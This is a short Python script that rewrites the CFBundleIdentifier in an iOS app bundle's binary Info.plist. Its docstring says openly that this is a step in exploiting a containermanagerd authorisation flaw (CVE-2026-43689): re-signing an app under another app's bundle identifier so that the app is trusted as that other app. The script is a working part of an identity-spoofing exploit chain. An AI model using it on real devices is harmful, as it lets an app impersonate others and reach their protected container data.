#!/usr/bin/env python3
"""Rewrite CFBundleIdentifier in an app bundle's Info.plist.

The containermanagerd "identity trust" flaw (CVE-2026-43689, CWE-862)
authorises the caller by the CodeDirectory identifier, and ldid takes the
identifier from CFBundleIdentifier. Signing with another bundle id is
therefore the point of the attack.

The staged Info.plist is a BINARY plist, so it has to be handled with
plistlib, not with sed.
"""
import sys, plistlib

path, newid = sys.argv[1], sys.argv[2]
with open(path, 'rb') as f:
    pl = plistlib.load(f)
old = pl.get('CFBundleIdentifier')
pl['CFBundleIdentifier'] = newid
with open(path, 'wb') as f:
    plistlib.dump(pl, f, fmt=plistlib.FMT_BINARY)
print("[IPA] CFBundleIdentifier: %s -> %s" % (old, newid))
